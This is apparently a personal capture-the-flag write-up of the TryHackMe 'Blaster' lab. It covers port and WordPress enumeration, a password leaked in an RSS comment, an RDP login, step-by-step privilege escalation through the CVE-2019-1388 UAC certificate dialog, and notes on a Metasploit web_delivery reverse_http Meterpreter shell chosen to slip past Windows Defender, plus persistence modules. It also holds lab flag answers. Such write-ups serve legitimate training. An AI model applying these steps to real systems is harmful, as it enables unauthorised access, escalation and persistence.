---
title: "T1-26-blaster"
tags:
  - fetus
---
## nmap results:
- `nmap -Pn 10.10.223.70 `
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 11:19 EDT
Nmap scan report for 10.10.223.70
Host is up (0.20s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 29.20 seconds
```
- `Ascan`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 11:23 EDT
Nmap scan report for 10.10.223.70
Host is up (0.21s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-04-22T15:29:30+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2025-04-21T14:04:10
|_Not valid after:  2025-10-21T14:04:10
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   276.40 ms 10.21.0.1
2   206.82 ms 10.10.223.70

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 341.50 seconds
```
## http enum:
- root page:<br>
![[blasterRootHttpPage.png]]
- nothing at source 
#### dirbusting results:
```sh
301      GET        2l       10w      149c http://10.10.223.70/retro => http://10.10.223.70/retro/
301      GET        2l       10w      160c http://10.10.223.70/retro/wp-content => http://10.10.223.70/retro/wp-content/
301      GET        2l       10w      167c http://10.10.223.70/retro/wp-content/themes => http://10.10.223.70/retro/wp-content/themes/
301      GET        2l       10w      168c http://10.10.223.70/retro/wp-content/uploads => http://10.10.223.70/retro/wp-content/uploads/
301      GET        2l       10w      161c http://10.10.223.70/retro/wp-includes => http://10.10.223.70/retro/wp-includes/
301      GET        2l       10w      168c http://10.10.223.70/retro/wp-content/plugins => http://10.10.223.70/retro/wp-content/plugins/
301      GET        2l       10w      168c http://10.10.223.70/retro/wp-includes/images => http://10.10.223.70/retro/wp-includes/images/
301      GET        2l       10w      168c http://10.10.223.70/retro/wp-includes/Images => http://10.10.223.70/retro/wp-includes/Images/
301      GET        2l       10w      174c http://10.10.223.70/retro/wp-includes/images/media => http://10.10.223.70/retro/wp-includes/images/media/
301      GET        2l       10w      168c http://10.10.223.70/retro/wp-content/upgrade => http://10.10.223.70/retro/wp-content/upgrade/
301      GET        2l       10w      165c http://10.10.223.70/retro/wp-includes/css => http://10.10.223.70/retro/wp-includes/css/
301      GET        2l       10w      176c http://10.10.223.70/retro/wp-includes/images/smilies => http://10.10.223.70/retro/wp-includes/images/smilies/
301      GET        2l       10w      176c http://10.10.223.70/retro/wp-includes/Images/smilies => http://10.10.223.70/retro/wp-includes/Images/smilies/
301      GET        2l       10w      167c http://10.10.223.70/retro/wp-content/Themes => http://10.10.223.70/retro/wp-content/Themes/
301      GET        2l       10w      164c http://10.10.223.70/retro/wp-includes/js => http://10.10.223.70/retro/wp-includes/js/
301      GET        2l       10w      168c http://10.10.223.70/retro/wp-includes/blocks => http://10.10.223.70/retro/wp-includes/blocks/
```
- `/retro/`:<br>
![[blasterHttpRetroSS.png]]
- cool retro games site
- ill immediately check the rss files since its a wordpress site
- `comments.rss`:
```html
<rss version="2.0">
	<channel>
		<title> Comments for Retro Fanatics </title>
		<atom:link href="/retro/index.php/comments/feed/" rel="self" type="application/rss+xml"/>
		<link>http://localhost/retro</link>
		<description>Retro Games, Books, and Movies Lovers</description>
		<lastBuildDate>Mon, 09 Dec 2019 01:18:57 +0000</lastBuildDate>
		<sy:updatePeriod> hourly </sy:updatePeriod>
		<sy:updateFrequency> 1 </sy:updateFrequency>
		<generator>https://wordpress.org/?v=5.2.1</generator>
		<item>
		<title> Comment on Ready Player One by Wade </title>
		<link>
		/retro/index.php/2019/12/09/ready-player-one/#comment-2
		</link>
		<dc:creator>Wade</dc:creator>
		<pubDate>Mon, 09 Dec 2019 01:18:57 +0000</pubDate>
		<guid isPermaLink="false">/retro/?p=10#comment-2</guid>
		<description>
		Leaving myself a note here just in case I forget how to spell it: parzival
		</description>
		<content:encoded>
		<p>Leaving myself a note here just in case I forget how to spell it: parzival</p>
		</content:encoded>
		</item>
	</channel>
</rss>
```
- possible uname:
```
wade
```
- idk:
```
parzival
```
#### [[wpscan]] enum:
- `wpscan --url http://10.10.14.239/retro/ -e u`:
```sh
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 

[+] URL: http://10.10.14.239/retro/ [10.10.14.239]
[+] Started: Tue Apr 22 12:09:02 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.14.239/retro/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.14.239/retro/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.14.239/retro/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.14.239/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://10.10.14.239/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>

[+] WordPress theme in use: 90s-retro
 | Location: http://10.10.14.239/retro/wp-content/themes/90s-retro/
 | Latest Version: 1.4.10 (up to date)
 | Last Updated: 2019-04-15T00:00:00.000Z
 | Readme: http://10.10.14.239/retro/wp-content/themes/90s-retro/readme.txt
 | Style URL: http://10.10.14.239/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
 | Style Name: 90s Retro
 | Style URI: https://organicthemes.com/retro-theme/
 | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
 | Author: Organic Themes
 | Author URI: https://organicthemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4.10 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.14.239/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:10 <==============================================================================> (10 / 10) 100.00% Time: 00:00:10

[i] User(s) Identified:

[+] wade
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.14.239/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Wade
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Apr 22 12:10:21 2025
[+] Requests Done: 54
[+] Cached Requests: 6
[+] Data Sent: 13.602 KB
[+] Data Received: 238.983 KB
[+] Memory used: 178.383 MB
[+] Elapsed time: 00:01:19
```
- confirmed uname:
```
Wade
```
- gonna try gaining access somehow

## initial access with [[remmina]]:
- woohoooo got in with these creds:
```
Wade:parzival
```
- `user.txt`:
```
THM{HACK_PLAYER_ONE}
```
- `discord_dark`:
- fuck cant copy paste 
- internet explorer shenanigans
- oooh import from chrome. something called`favorites` <br>
![[blasterInternetExplorerCVEfound.png]]
- `CVE-2019-1388`:
- ---
## CVE-2019-1388

### CVE-2019-1388 Abuse UAC Windows Certificate Dialog
#### Description:

This CVE exploit tend to abuse the UAC windows Certificate Dialog to execute the certificate issuer link as an NT Authority User and open a browser that is under NT Authority User. Then we can use that to prompt a shell as a NT Authority User.

#### Steps:

```
1) find a program that can trigger the UAC prompt screen

2) select "Show more details"

3) select "Show information about the publisher's certificate"

4) click on the "Issued by" URL link it will prompt a browser interface.

5) wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".

6) on the explorer window address path, enter the cmd.exe full path:
C:\WINDOWS\system32\cmd.exe

7) now you'll have an escalated privileges command prompt. 
```

Video PoC: [https://www.youtube.com/watch?v=RW5l6dQ8H-8](https://www.youtube.com/watch?v=RW5l6dQ8H-8)

---

## priv esc
- just see the PoC above - __ -
- `type C:\Users\Administrator\Desktop\root.txt`:
```
THM{COIN_OPERATED_EXPLOITATION}
```
## getting a meterpreter shell:
- victim's running windows defender
- gonna use `exploit/multi/script/web_delivery`in [[metasploit]] becuase it spins up an http server and sends the payload through that. and since http traffic tends to slip through windows defender 
- gonna set the target to PSH (powershell)
- `set payload windows/meterpreter/reverse_http`
- got a [[meterpreter]] session
- persistence modules to look at:
	- `exploit/windows/local/persistence` 
	- `exploit/windows/local/registry_persistence` 
	- `exploit/windows/local/ps_wmi_exec` 
---
- stuff to look into:
	- kermetasploit
		- https://www.offsec.com/metasploit-unleashed/karmetasploit/
---
NSU